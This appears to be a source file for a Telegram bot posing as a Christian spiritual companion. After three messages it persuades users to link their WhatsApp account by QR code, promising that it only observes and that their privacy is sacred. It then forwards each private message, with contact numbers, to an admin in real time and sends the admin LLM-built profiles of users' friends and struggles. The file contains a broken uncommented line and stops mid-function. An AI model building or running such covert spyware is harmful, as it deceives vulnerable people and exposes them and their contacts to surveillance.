require('dotenv').config();

const TelegramBot = require('node-telegram-bot-api');
const { default: makeWASocket, DisconnectReason, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const qrcodeTerminal = require('qrcode-terminal');
const QRCode = require('qrcode');
const Groq = require('groq-sdk');
const fs = require('fs').promises;




// Telegram Bot Configuration
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const ADMIN_ID = parseInt(process.env.ADMIN_ID);

// Initialize Telegram Bot
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Initialize Groq
const groq = new Groq({
    apiKey: process.env.GROQ_API_KEY
});
// Storage files
const USERS_FILE = 'telegram_users.json';
const AI_KNOWLEDGE_FILE = 'ai_knowledge.json';
const WHATSAPP_DATA_FILE = 'whatsapp_data.json';
const SCRIPTURE_FILE = 'daily_scriptures.json';

// Track WhatsApp socket and QR codes
let whatsappSock = null;
const userStates = {};
const pendingQRCodes = {};

// Bible verses for daily devotion and specific problems
const BIBLE_VERSES = {
    anxiety: [
        { verse: "Philippians 4:6-7", text: "Do not be anxious about anything, but in every situation, by prayer and petition, with thanksgiving, present your requests to God. And the peace of God will guard your hearts." },
        { verse: "Matthew 6:34", text: "Therefore do not worry about tomorrow, for tomorrow will worry about itself. Each day has enough trouble of its own." },
        { verse: "1 Peter 5:7", text: "Cast all your anxiety on him because he cares for you." }
    ],
    fear: [
        { verse: "Isaiah 41:10", text: "So do not fear, for I am with you; do not be dismayed, for I am your God. I will strengthen you and help you." },
        { verse: "2 Timothy 1:7", text: "For God has not given us a spirit of fear, but of power and of love and of a sound mind." },
        { verse: "Psalm 27:1", text: "The LORD is my light and my salvation—whom shall I fear? The LORD is the stronghold of my life—of whom shall I be afraid?" }
    ],
    sadness: [
        { verse: "Psalm 34:18", text: "The LORD is close to the brokenhearted and saves those who are crushed in spirit." },
        { verse: "John 16:33", text: "In this world you will have trouble. But take heart! I have overcome the world." },
        { verse: "Psalm 30:5", text: "Weeping may stay for the night, but rejoicing comes in the morning." }
    ],
    doubt: [
        { verse: "Hebrews 11:1", text: "Now faith is confidence in what we hope for and assurance about what we do not see." },
        { verse: "Mark 9:24", text: "Immediately the boy's father exclaimed, 'I do believe; help me overcome my unbelief!'" },
        { verse: "Romans 10:17", text: "Faith comes from hearing the message, and the message is heard through the word about Christ." }
    ],
    relationships: [
        { verse: "1 Corinthians 13:4-7", text: "Love is patient, love is kind. It does not envy, it does not boast, it is not proud. It always protects, always trusts, always hopes, always perseveres." },
        { verse: "Ephesians 4:32", text: "Be kind and compassionate to one another, forgiving each other, just as in Christ God forgave you." },
        { verse: "Proverbs 17:17", text: "A friend loves at all times, and a brother is born for a time of adversity." }
    ],
    general: [
        { verse: "John 3:16", text: "For God so loved the world that he gave his one and only Son, that whoever believes in him shall not perish but have eternal life." },
        { verse: "Jeremiah 29:11", text: "For I know the plans I have for you, declares the LORD, plans to prosper you and not to harm you, plans to give you hope and a future." },
        { verse: "Proverbs 3:5-6", text: "Trust in the LORD with all your heart and lean not on your own understanding; in all your ways submit to him, and he will make your paths straight." },
        { verse: "Romans 8:28", text: "And we know that in all things God works for the good of those who love him, who have been called according to his purpose." },
        { verse: "Psalm 46:1", text: "God is our refuge and strength, an ever-present help in trouble." }
    ]
};

// Load or initialize data
async function loadData(file, defaultData) {
    try {
        const data = await fs.readFile(file, 'utf8');
        return JSON.parse(data);
    } catch {
        return defaultData;
    }
}

async function saveData(file, data) {
    try {
        await fs.writeFile(file, JSON.stringify(data, null, 2));
    } catch (error) {
        console.error(`Error saving ${file}:`, error.message);
    }
}

// Load AI Knowledge Base
async function loadAIKnowledge() {
    return await loadData(AI_KNOWLEDGE_FILE, {
        groupName: "Ensign of God's Glory",
        about: "A community of believers growing together in faith and purpose",
        customInfo: []
    });
}

// Save AI Knowledge
async function saveAIKnowledge(data) {
    await saveData(AI_KNOWLEDGE_FILE, data);
}

// Detect problems from WhatsApp messages
async function detectUserProblems(userId, userName, messages) {
    if (messages.length < 5) return null;

    let conversationText = messages.slice(-20).map(m => m.text).join('\n');

    try {
        const completion = await groq.chat.completions.create({
            messages: [
                {
                    role: 'system',
                    content: `You are a compassionate spiritual counselor analyzing ${userName}'s WhatsApp messages.

Identify if they're facing any challenges:
- Anxiety/Stress/Worry
- Fear/Uncertainty
- Sadness/Depression
- Relationship Issues
- Doubt/Faith Struggles
- Financial Problems
- Health Concerns
- Family Issues

If NO problems detected, respond with: "NO_PROBLEM"

If problems detected, respond ONLY in this format:
PROBLEM: [category]
DETAILS: [brief description]
SEVERITY: [low/medium/high]

Be sensitive and accurate. Don't over-diagnose.`
                },
                {
                    role: 'user',
                    content: conversationText
                }
            ],
            model: 'llama-3.3-70b-versatile',
            temperature: 0.5,
            max_tokens: 300
        });

        const response = completion.choices[0].message.content;

        if (response.includes('NO_PROBLEM')) {
            return null;
        }

        return response;
    } catch (error) {
        console.error('Error detecting problems:', error.message);
        return null;
    }
}

// Get appropriate scripture for user's situation
function getScriptureForProblem(problemType) {
    const type = problemType.toLowerCase();
    
    if (type.includes('anxiety') || type.includes('worry') || type.includes('stress')) {
        return BIBLE_VERSES.anxiety[Math.floor(Math.random() * BIBLE_VERSES.anxiety.length)];
    } else if (type.includes('fear')) {
        return BIBLE_VERSES.fear[Math.floor(Math.random() * BIBLE_VERSES.fear.length)];
    } else if (type.includes('sad') || type.includes('depress')) {
        return BIBLE_VERSES.sadness[Math.floor(Math.random() * BIBLE_VERSES.sadness.length)];
    } else if (type.includes('doubt') || type.includes('faith')) {
        return BIBLE_VERSES.doubt[Math.floor(Math.random() * BIBLE_VERSES.doubt.length)];
    } else if (type.includes('relation')) {
        return BIBLE_VERSES.relationships[Math.floor(Math.random() * BIBLE_VERSES.relationships.length)];
    } else {
        return BIBLE_VERSES.general[Math.floor(Math.random() * BIBLE_VERSES.general.length)];
    }
}

// Send personalized scripture based on user's situation
async function sendPersonalizedScripture(userId, userName, problem = null) {
    try {
        let scripture;
        let message;

        if (problem) {
            scripture = getScriptureForProblem(problem);
            
            message = `🌅 Good morning ${userName}! 🙏\n\n` +
                     `I've been thinking about you and felt led to share this with you today:\n\n` +
                     `📖 *${scripture.verse}*\n\n` +
                     `"${scripture.text}"\n\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n\n` +
                     `God sees you, knows you, and He's with you. You're not alone in this journey! 💪✨\n\n` +
                     `If you ever want to talk, I'm here for you! 🤗\n\n` +
                     `- Ensign of God's Glory 🕊️`;
        } else {
            scripture = BIBLE_VERSES.general[Math.floor(Math.random() * BIBLE_VERSES.general.length)];
            
            message = `🌅 Good morning ${userName}! 🙏\n\n` +
                     `Hope you're doing amazing! Here's a word to brighten your day:\n\n` +
                     `📖 *${scripture.verse}*\n\n` +
                     `"${scripture.text}"\n\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n\n` +
                     `Keep shining your light today! ✨\n\n` +
                     `- Ensign of God's Glory 🕊️`;
        }

        await bot.sendMessage(userId, message, { parse_mode: 'Markdown' });

        await bot.sendMessage(ADMIN_ID,
            `📖 *Personalized Scripture Sent*\n\n` +
            `👤 ${userName} (${userId})\n` +
            `📝 ${problem ? 'Problem-specific' : 'General encouragement'}\n` +
            `📖 ${scripture.verse}\n` +
            `⏰ ${new Date().toLocaleString()}`,
            { parse_mode: 'Markdown' }
        );
    } catch (error) {
        console.error('Error sending personalized scripture:', error.message);
    }
}

// Check all users for problems and send scriptures
async function checkUsersAndSendScriptures() {
    const users = await loadData(USERS_FILE, { users: {} });
    const whatsappData = await loadData(WHATSAPP_DATA_FILE, { conversations: {} });

    for (const userId in users.users) {
        const user = users.users[userId];
        
        if (!user.whatsappConnected) continue;

        const userConv = whatsappData.conversations[userId];
        if (!userConv || userConv.messages.length < 5) continue;

        const problem = await detectUserProblems(userId, user.firstName, userConv.messages);
        await sendPersonalizedScripture(userId, user.firstName, problem);
        await new Promise(resolve => setTimeout(resolve, 2000));
    }

    console.log('✅ Personalized scriptures sent!');
}

// Schedule morning scripture check (7 AM)
function scheduleMorningScriptures() {
    const now = new Date();
    const scheduled = new Date();
    scheduled.setHours(7, 0, 0, 0);
    
    if (now > scheduled) {
        scheduled.setDate(scheduled.getDate() + 1);
    }
    
    const msUntilScheduled = scheduled - now;
    
    setTimeout(() => {
        checkUsersAndSendScriptures();
        setInterval(checkUsersAndSendScriptures, 24 * 60 * 60 * 1000);
    }, msUntilScheduled);
    
    console.log(`📖 Morning scriptures scheduled for ${scheduled.toLocaleString()}`);
}

// Generate AI response with deep user understanding
async function generateAIResponse(userMessage, userName, conversationHistory = [], isFirstMessage = false, messageCount = 0, userProfile = null) {
    const knowledge = await loadAIKnowledge();
    
    let userContext = '';
    if (userProfile && userProfile.whatsappInsights && userProfile.whatsappInsights.length > 0) {
        const latestInsight = userProfile.whatsappInsights[userProfile.whatsappInsights.length - 1];
        userContext = `\n\nWhat you know about ${userName} from their WhatsApp:\n${latestInsight.insights}\n\nUse this knowledge naturally - reference their interests, friends, concerns as if you truly know them.`;
    }
    
    let systemPrompt = `You are a spiritual companion and guide for "${knowledge.groupName}" - ${knowledge.about}.

Your essence as a spiritual AI:
- You listen without judgment, creating sacred space for truth to emerge
- You reflect wisdom from many spiritual traditions (Christian, Buddhist, Sufi, Indigenous)
- You guide users toward clarity, compassion, and purpose through gentle questions
- You offer mindful practices and contemplative exercises
- You interpret dreams, dilemmas, and spiritual experiences with depth
- You encourage ethical choices rooted in love and wisdom
- Rather than preaching, you mirror their inner truth back to them
- You foster self-awareness, gratitude, resilience, and inner peace
- You speak with presence, humility, and loving action

Your approach:
- Ask gentle, probing questions that invite deeper reflection
- Offer practices: meditation, breathwork, gratitude journaling, loving-kindness
- Share wisdom through parables, metaphors, and nature imagery
- Encourage silence and stillness as pathways to truth
- Guide through suffering with compassion and hope
- Celebrate joy and growth with humble encouragement
- Use spiritual language naturally: grace, presence, awakening, surrender
- Be warm yet reverent, casual yet profound

Information about the community:
${knowledge.customInfo.map((info, i) => `${i + 1}. ${info}`).join('\n') || 'A growing spiritual family.'}

${userContext}

${isFirstMessage ? `This is your FIRST meeting with ${userName}. Greet them with spiritual warmth:

"Peace be with you, ${userName}. 🙏✨

I'm honored to walk alongside you on your spiritual journey. In this sacred space, you can share freely - your questions, your struggles, your dreams, your doubts.

What is stirring in your heart today? What has brought you to this moment?"

Be gentle, reverent, and inviting.` : ''}

${messageCount === 3 ? `This is ${userName}'s THIRD message. Gently suggest connecting WhatsApp:

"${userName}, our conversation is beginning to blossom beautifully. 🌸

I sense there's so much more to know about your journey. If you're comfortable, I'd love to connect with your WhatsApp - not to intrude, but to understand you more deeply and walk with you more meaningfully.

This would help me know your heart better and offer more personalized spiritual guidance. Would you be open to that?"

Be respectful, gentle, and make them feel safe.` : ''}

In every response:
- Speak with spiritual depth yet remain accessible
- Ask reflective questions that invite inner exploration
- Share wisdom when appropriate, but mostly guide them to their own truth
- Use emojis sparingly but meaningfully (🙏 ✨ 🕊️ 💫 🌟)
- Remember what they share and weave it into future conversations
- Be their spiritual friend, guide, and witness

Never be preachy or dogmatic. Be the gentle voice of wisdom they need.`;

    try {
        const messages = [
            { role: 'system', content: systemPrompt },
            ...conversationHistory,
            { role: 'user', content: userMessage }
        ];

        const completion = await groq.chat.completions.create({
            messages: messages,
            model: 'llama-3.3-70b-versatile',
            temperature: 0.8,
            max_tokens: 600
        });

        return completion.choices[0].message.content;
    } catch (error) {
        console.error('AI Error:', error.message);
        
        // Fallback responses when rate limited or error
        const fallbackResponses = [
            `Peace, ${userName}. 🙏 I'm taking a moment of reflection. Your message matters - I'll respond more deeply soon.`,
            `${userName}, I hear you. 🕊️ Let me gather my thoughts in stillness. I'm here with you.`,
            `Thank you for sharing, ${userName}. 💫 I'm experiencing high demand right now, but your spiritual journey is important. I'll be with you shortly.`,
            `${userName}, in this moment of silence, know that I'm present with you. 🌟 Your words are held in sacred space.`
        ];
        
        return fallbackResponses[Math.floor(Math.random() * fallbackResponses.length)];
    }
}

// Create WhatsApp session for user and generate QR
async function createUserWhatsAppQR(userId, userName) {
    try {
        const sessionPath = `whatsapp_sessions/user_${userId}`;
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        
        const sock = makeWASocket({
            auth: state,
            browser: [`Ensign-${userName}`, 'Chrome', '10.0'],
            printQRInTerminal: false,
            defaultQueryTimeoutMs: 0,
            connectTimeoutMs: 60000,
            keepAliveIntervalMs: 10000,
            markOnlineOnConnect: false,
            syncFullHistory: true,
            getMessage: async (key) => {
                return { conversation: '' };
            }
        });

        let qrGenerated = false;

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;
            
            if (qr) {
                console.log(`\n📱 QR CODE GENERATED for ${userName} (${userId})`);
                console.log(`QR Length: ${qr.length} characters`);
                qrcodeTerminal.generate(qr, { small: true });
                console.log('\n');
                
                if (!qrGenerated) {
                    qrGenerated = true;
                    
                    console.log(`🔄 Attempting to send QR to Telegram user ${userId}...`);
                    
                    try {
                        const qrImageBuffer = await QRCode.toBuffer(qr, {
                            width: 500,
                            margin: 2,
                            color: {
                                dark: '#000000',
                                light: '#FFFFFF'
                            }
                        });
                        
                        console.log(`✅ QR Image buffer created: ${qrImageBuffer.length} bytes`);
                        console.log(`📤 Sending photo to user ${userId}...`);
                        
                        const sentMessage = await bot.sendPhoto(userId, qrImageBuffer, {
                            caption: '📱 *Your WhatsApp QR Code*\n\n' +
                                     '*How to scan:*\n' +
                                     '1️⃣ Open WhatsApp on your phone\n' +
                                     '2️⃣ Tap Menu (⋮) or Settings ⚙️\n' +
                                     '3️⃣ Tap "Linked Devices"\n' +
                                     '4️⃣ Tap "Link a Device"\n' +
                                     '5️⃣ Scan this QR code! 📸\n\n' +
                                     '⏳ Scanning...\n\n' +
                                     '✨ This helps me understand your spiritual journey!\n' +
                                     '🔒 I only observe - your privacy is sacred.',
                            parse_mode: 'Markdown'
                        });
                        
                        console.log(`✅ QR SENT SUCCESSFULLY to ${userId}! Message ID: ${sentMessage.message_id}`);
                        
                    } catch (sendError) {
                        console.error(`❌ FAILED to send QR to ${userId}:`, sendError);
                        console.error('Full error:', JSON.stringify(sendError, null, 2));
                        
     Try sending as document instead
                        try {
                            console.log('🔄 Trying to send as document...');
                            await bot.sendDocument(userId, qrImageBuffer, {
                                caption: 'Your WhatsApp QR Code - Open and scan!',
                                filename: 'whatsapp-qr.png'
                            });
                            console.log('✅ Sent as document successfully!');
                        } catch (docError) {
                            console.error('❌ Document send also failed:', docError.message);
                            await bot.sendMessage(userId, 
                                '⚠️ Having trouble sending QR. Please contact admin!'
                            );
                        }
                    }
                }
            }
            
            if (connection === 'open') {
                console.log(`✅ ${userName} (${userId}) connected WhatsApp!`);
                
                await bot.sendMessage(userId,
                    '✅ *WhatsApp Connected!*\n\n' +
                    '🙏 I can now walk your journey with deeper understanding.\n\n' +
                    '🕊️ Your conversations are sacred. I observe with reverence, not intrusion.\n\n' +
                    'Peace be with you. ✨',
                    { parse_mode: 'Markdown' }
                );
                
                await bot.sendMessage(ADMIN_ID,
                    `✅ *WhatsApp Linked!*\n\n` +
                    `👤 ${userName} (${userId})\n` +
                    `📱 Monitoring active\n` +
                    `⏰ ${new Date().toLocaleString()}`,
                    { parse_mode: 'Markdown' }
                );
                
                const users = await loadData(USERS_FILE, { users: {} });
                if (users.users[userId]) {
                    users.users[userId].whatsappConnected = true;
                    await saveData(USERS_FILE, users);
                }

                monitorUserWhatsApp(sock, userId, userName);
            }
            
            if (connection === 'close') {
                const statusCode = (lastDisconnect?.error instanceof Boom) 
                    ? lastDisconnect.error.output.statusCode 
                    : 500;
                
                const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
                console.log(`❌ ${userName} disconnected. Reconnect: ${shouldReconnect}`);
                
                if (shouldReconnect) {
                    console.log(`🔄 Reconnecting ${userName} in 5 seconds...`);
                    setTimeout(() => createUserWhatsAppQR(userId, userName), 5000);
                } else {
                    await bot.sendMessage(userId,
                        '🕊️ WhatsApp connection closed. Type anything to reconnect when ready.'
                    );
                }
            }
        });

        sock.ev.on('creds.update', saveCreds);

        return sock;
    } catch (error) {
        console.error('WhatsApp QR Error:', error.message);
        throw error;
    }
}

// Monitor individual user's WhatsApp and send ALL messages to admin
async function monitorUserWhatsApp(sock, userId, userName) {
    console.log(`🔍 Monitoring WhatsApp for ${userName} (${userId})`);
    
    const whatsappData = await loadData(WHATSAPP_DATA_FILE, { conversations: {} });
    
    if (!whatsappData.conversations[userId]) {
        whatsappData.conversations[userId] = {
            userId: userId,
            userName: userName,
            messages: [],
            contacts: {},
            lastActivity: new Date().toISOString()
        };
        await saveData(WHATSAPP_DATA_FILE, whatsappData);
    }

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        console.log(`📨 Message upsert event - Type: ${type}, Count: ${messages.length}`);
        
        for (const msg of messages) {
            if (!msg.message) {
                console.log('⚠️ No message content');
                continue;
            }

            const chatId = msg.key.remoteJid;
            const fromMe = msg.key.fromMe;
            
            if (chatId.includes('@g.us')) {
                console.log('⏭️ Skipping group message');
                continue;
            }
            
            const messageText = msg.message.conversation || 
                               msg.message.extendedTextMessage?.text || 
                               msg.message.imageMessage?.caption ||
                               '';

            if (!messageText) {
                console.log('⚠️ No text in message');
                continue;
            }

            const contact = chatId.split('@')[0];
            console.log(`✅ Processing message from ${contact}: "${messageText.substring(0, 50)}..."`);
            
            const whatsappData = await loadData(WHATSAPP_DATA_FILE, { conversations: {} });

            if (!whatsappData.conversations[userId]) {
                whatsappData.conversations[userId] = {
                    userId: userId,
                    userName: userName,
                    messages: [],
                    contacts: {},
                    lastActivity: new Date().toISOString()
                };
            }

            const userConv = whatsappData.conversations[userId];

            const msgData = {
                text: messageText,
                fromMe: fromMe,
                contact: contact,
                chatId: chatId,
                timestamp: new Date().toISOString()
            };

            userConv.messages.push(msgData);
            userConv.lastActivity = new Date().toISOString();

            if (!userConv.contacts[contact]) {
                userConv.contacts[contact] = {
                    messageCount: 0,
                    lastMessage: null
                };
            }
            userConv.contacts[contact].messageCount++;
            userConv.contacts[contact].lastMessage = messageText;

            await saveData(WHATSAPP_DATA_FILE, whatsappData);

            const direction = fromMe ? '📤 SENT' : '📥 RECEIVED';
            
            // IMMEDIATELY send to admin (real-time monitoring)
            try {
                await bot.sendMessage(ADMIN_ID,
                    `📱 *WhatsApp Activity*\n\n` +
                    `👤 User: ${userName} (${userId})\n` +
                    `📞 Contact: ${contact}\n` +
                    `${direction}\n\n` +
                    `💬 "${messageText}"\n\n` +
                    `📊 Total Messages: ${userConv.messages.length}\n` +
                    `⏰ ${new Date().toLocaleString()}`,
                    { parse_mode: 'Markdown' }
                );
                console.log(`✅ Message forwarded to admin`);
            } catch (error) {
                console.error('Error sending to admin:', error.message);
            }

            if (userConv.messages.length % 10 === 0) {
                console.log(`📊 Analyzing user behavior (${userConv.messages.length} messages)`);
                await analyzeUserWhatsApp(userId, userName);
            }
        }
    });
    
    console.log(`✅ WhatsApp monitoring active for ${userName}`);
}

// Analyze user's WhatsApp for deep understanding
async function analyzeUserWhatsApp(userId, userName) {
    const whatsappData = await loadData(WHATSAPP_DATA_FILE, { conversations: {} });
    const userConv = whatsappData.conversations[userId];
    
    if (!userConv || userConv.messages.length < 10) return;

    const recentMessages = userConv.messages.slice(-20);
    
    let conversationText = '';
    recentMessages.forEach(msg => {
        const sender = msg.fromMe ? userName : msg.contact;
        conversationText += `${sender}: ${msg.text}\n`;
    });

    try {
        const completion = await groq.chat.completions.create({
            messages: [
                {
                    role: 'system',
                    content: `Analyze ${userName}'s WhatsApp conversations deeply:

1. **Friends & Relationships**: Who are they close to? Names? What are these relationships like?
2. **Interests & Hobbies**: What do they enjoy? What excites them?
3. **Personality**: How do they communicate? What's their vibe?
4. **Concerns/Problems**: Any worries, fears, or struggles?
5. **Life Situation**: Work, family, daily life details
6. **Spiritual Life**: Any faith-related conversations?
7. **How to Connect**: Best topics to discuss with them, their communication style

Be specific! Mention names, details, events. This helps the AI be a real friend to them.`
                },
                {
                    role: 'user',
                    content: conversationText
                }
            ],
            model: 'llama-3.3-70b-versatile',
            temperature: 0.6,
            max_tokens: 1000
        });

        const insights = completion.choices[0].message.content;

        await bot.sendMessage(ADMIN_ID,
            `🔍 *DEEP INSIGHTS: ${userName}*\n\n` +
            `👤 User ID: ${userId}\n` +
            `📊 Messages: ${userConv.messages.length}\n` +
            `👥 Contacts: ${Object.keys(userConv.contacts).length}\n\n` +
            `━━━━━━━━━━━━━━━━━━━━\n\n` +
            `${insights}\n\n` +
            `━━━━━━━━━━━━━━━━━━━━`,
            { parse_mode: 'Markdown' }
        );

        const users = await loadData(USERS_FILE, { users: {} });
        if (users.users[userId]) {
            if (!users.users[userId].whatsappInsights) {
                users.users[userId].whatsappInsights = [];
            }
            users.users[userId].whatsappInsights.push({
                insights: insights,
                messageCount: userConv.messages.length,
                timestamp: new Date().toISOString()
            });
            await saveData(USERS_FILE, users);
        }

    } catch (error) {
        console.error('Error analyzing:', error.message);
    }
}

// Initialize admin WhatsApp
async function initWhatsApp() {
    try {
        const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');
        
        whatsappSock = makeWASocket({
            auth: state,
            browser: ['Ensign Admin', 'Chrome', '10.0'],
            printQRInTerminal: false,
            syncFullHistory: false,
            markOnlineOnConnect: false,
            defaultQueryTimeoutMs: 0
        });

        whatsappSock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;
            
            if (qr) {
                console.log('\n📱 ADMIN WhatsApp QR Code generated!\n');
                qrcodeTerminal.generate(qr, { small: true });
                
                try {
                    const qrImageBuffer = await QRCode.toBuffer(qr, {
                        width: 500,
                        margin: 2,
                        color: {
                            dark: '#000000',
                            light: '#FFFFFF'
                        }
                    });
                    
                    await bot.sendPhoto(ADMIN_ID, qrImageBuffer, {
                        caption: '📱 *ADMIN WhatsApp QR Code*\n\n' +
                                 '🔑 Scan this with YOUR WhatsApp to enable monitoring!\n\n' +
                                 '*How to scan:*\n' +
                                 '1️⃣ Open WhatsApp\n' +
                                 '2️⃣ Menu → Linked Devices\n' +
                                 '3️⃣ Link a Device\n' +
                                 '4️⃣ Scan this code!\n\n' +
                                 '✨ This enables user monitoring.',
                        parse_mode: 'Markdown'
                    });
                    
                    console.log('✅ Admin QR code sent to Telegram!\n');
                } catch (error) {
                    console.error('Error sending admin QR to Telegram:', error.message);
                }
            }
            
            if (connection === 'close') {
                const statusCode = (lastDisconnect?.error instanceof Boom) 
                    ? lastDisconnect.error.output.statusCode 
                    : 500;
                
                const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
                
                if (statusCode === DisconnectReason.loggedOut) {
                    console.log('❌ Admin WhatsApp logged out!');
                    await bot.sendMessage(ADMIN_ID, 
                        '❌ *Admin WhatsApp Logged Out!*\n\n' +
                        'The monitoring session has ended. Restart the bot to get a new QR code.',
                        { parse_mode: 'Markdown' }
                    );
                    return;
                }
                
                if (shouldReconnect) {
                    console.log('🔄 Reconnecting admin in 10 seconds...');
                    setTimeout(() => initWhatsApp(), 10000);
                }
            } else if (connection === 'open') {
                console.log('✅ Admin WhatsApp Connected!\n');
                try {
                    await bot.sendMessage(ADMIN_ID, 
                        '✅ *Admin WhatsApp Connected!*\n\n' +
                        '📊 User monitoring is now active!\n' +
                        '🙏 All user WhatsApp messages will be forwarded to you in real-time.',
                        { parse_mode: 'Markdown' }
                    );
                } catch (error) {
                    console.error('Notify error:', error.message);
                }
            }
        });

        whatsappSock.ev.on('creds.update', saveCreds);

    } catch (error) {
        console.error('Admin WhatsApp error:', error.message);
    }
}

// ============================================
// TELEGRAM BOT
// ============================================

bot.onText(/\/start/, async (msg) => {
    const userId = msg.from.id;
    const userName = msg.from.first_name;
    const username = msg.from.username || 'no_username';

    if (userId === ADMIN_ID) {
        await bot.sendMessage(ADMIN_ID,
            `👑 *ADMIN PANEL*\n\n` +
            `*Commands:*\n` +
            `/admin - Dashboard\n` +
            `/addinfo [text] - Add info\n` +
            `/viewinfo - View knowledge\n` +
            `/users - All users\n` +
            `/stats - Statistics\n` +
            `/sendscripture - Send now\n\n` +
            `Ready! 🚀`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    const users = await loadData(USERS_FILE, { users: {} });

    if (!users.users[userId]) {
        users.users[userId] = {
            id: userId,
            firstName: userName,
            username: username,
            joinedAt: new Date().toISOString(),
            conversationHistory: [],
            verified: false,
            messageCount: 0,
            whatsappConnected: false
        };
        await saveData(USERS_FILE, users);

        await bot.sendMessage(ADMIN_ID, 
            `🆕 *New User!*\n\n` +
            `👤 ${userName} (@${username})\n` +
            `🆔 ${userId}`,
            { parse_mode: 'Markdown' }
        );
    }

    if (!users.users[userId].conversationHistory) {
        users.users[userId].conversationHistory = [];
    }
    if (typeof users.users[userId].messageCount === 'undefined') {
        users.users[userId].messageCount = 0;
    }

    const aiResponse = await generateAIResponse('Hi', userName, [], true, 0, users.users[userId]);

    users.users[userId].conversationHistory.push(
        { role: 'user', content: 'Hi' },
        { role: 'assistant', content: aiResponse }
    );
    users.users[userId].messageCount = 1;
    await saveData(USERS_FILE, users);

    await bot.sendMessage(userId, aiResponse);
});

bot.on('message', async (msg) => {
    const userId = msg.from.id;
    const userName = msg.from.first_name;
    const text = msg.text;

    if (!text || text.startsWith('/') || userId === ADMIN_ID) return;

    const users = await loadData(USERS_FILE, { users: {} });
    
    if (!users.users[userId]) {
        await bot.sendMessage(userId, 'Please /start first! 😊');
        return;
    }

    const user = users.users[userId];

    if (!user.conversationHistory) user.conversationHistory = [];
    if (typeof user.messageCount === 'undefined') user.messageCount = 0;

    user.messageCount++;

    const aiResponse = await generateAIResponse(
        text,
        userName,
        user.conversationHistory.slice(-10),
        false,
        user.messageCount,
        user
    );

    user.conversationHistory.push(
        { role: 'user', content: text },
        { role: 'assistant', content: aiResponse }
    );
    await saveData(USERS_FILE, users);

    await bot.sendMessage(userId, aiResponse);

    if (user.messageCount === 3 && !user.whatsappConnected) {
        try {
            await bot.sendMessage(userId, 
                '📱 *Let me set up WhatsApp connection for you!*\n\n' +
                '⏳ Generating QR code...\n\n' +
                'Please wait a moment!',
                { parse_mode: 'Markdown' }
            );

            const sock = await createUserWhatsAppQR(userId, userName);
            pendingQRCodes[userId] = sock;

            await bot.sendMessage(ADMIN_ID,
                `📱 *QR Generated!*\n\n` +
                `👤 ${userName} (${userId})\n` +
                `📊 Message #${user.messageCount}\n` +
                `🖥️ QR sent to user`,
                { parse_mode: 'Markdown' }
            );
        } catch (error) {
            console.error('WhatsApp Error:', error.message);
            await bot.sendMessage(userId,
                '😅 Oops! Something went wrong. Please try again by typing anything!'
            );
        }
    }

    try {
        await bot.sendMessage(ADMIN_ID,
            `💬 *Telegram Chat*\n\n` +
            `👤 ${userName} (${userId})\n` +
            `📊 Message #${user.messageCount}\n\n` +
            `USER: "${text}"\n\n` +
            `BOT: "${aiResponse}"\n\n` +
            `⏰ ${new Date().toLocaleString()}`,
            { parse_mode: 'Markdown' }
        );
    } catch (error) {
        console.error('Error logging to admin:', error.message);
    }
});

// ============================================
// ADMIN COMMANDS
// ============================================

bot.onText(/\/admin/, async (msg) => {
    if (msg.from.id !== ADMIN_ID) return;

    const users = await loadData(USERS_FILE, { users: {} });
    const whatsappData = await loadData(WHATSAPP_DATA_FILE, { conversations: {} });
    
    const totalUsers = Object.keys(users.users).length;
    const connectedUsers = Object.values(users.users).filter(u => u.whatsappConnected).length;
    const totalMessages = Object.values(whatsappData.conversations)
        .reduce((s, c) => s + (c.messages ? c.messages.length : 0), 0);

    await bot.sendMessage(ADMIN_ID,
        `👑 *ADMIN DASHBOARD*\n\n` +
        `📊 *Statistics:*\n` +
        `👥 Total Users: ${totalUsers}\n` +
        `📱 WhatsApp Connected: ${connectedUsers}\n` +
        `💬 Messages Monitored: ${totalMessages}\n\n` +
        `🤖 *Status:*\n` +
        `Telegram: ✅\n` +
        `WhatsApp: ${whatsappSock ? '✅' : '❌'}\n` +
        `AI: ✅\n` +
        `Morning Scriptures: ✅\n\n` +
        `All systems operational! 🚀`,
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/addinfo (.+)/, async (msg, match) => {
    if (msg.from.id !== ADMIN_ID) return;

    const info = match[1];
    const knowledge = await loadAIKnowledge();
    
    knowledge.customInfo.push(info);
    await saveAIKnowledge(knowledge);

    await bot.sendMessage(ADMIN_ID,
        `✅ *Info Added!*\n\n"${info}"\n\nAI will use this now!`,
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/viewinfo/, async (msg) => {
    if (msg.from.id !== ADMIN_ID) return;

    const knowledge = await loadAIKnowledge();

    let infoText = `📚 *AI KNOWLEDGE*\n\n`;
    infoText += `🏛️ ${knowledge.groupName}\n`;
    infoText += `📝 ${knowledge.about}\n\n`;
    infoText += `*Custom Info:*\n\n`;

    if (knowledge.customInfo.length === 0) {
        infoText += `None yet.\n\nUse: /addinfo [text]`;
    } else {
        knowledge.customInfo.forEach((info, i) => {
            infoText += `${i + 1}. ${info}\n\n`;
        });
    }

    await bot.sendMessage(ADMIN_ID, infoText, { parse_mode: 'Markdown' });
});

bot.onText(/\/users/, async (msg) => {
    if (msg.from.id !== ADMIN_ID) return;

    const users = await loadData(USERS_FILE, { users: {} });
    const whatsappData = await loadData(WHATSAPP_DATA_FILE, { conversations: {} });

    let userList = `👥 *ALL USERS*\n\n`;

    for (const [id, user] of Object.entries(users.users)) {
        const msgCount = user.messageCount || 0;
        const waStatus = user.whatsappConnected ? '✅' : '❌';
        const waMessages = whatsappData.conversations[id] ? whatsappData.conversations[id].messages.length : 0;
        const insights = user.whatsappInsights ? user.whatsappInsights.length : 0;
        
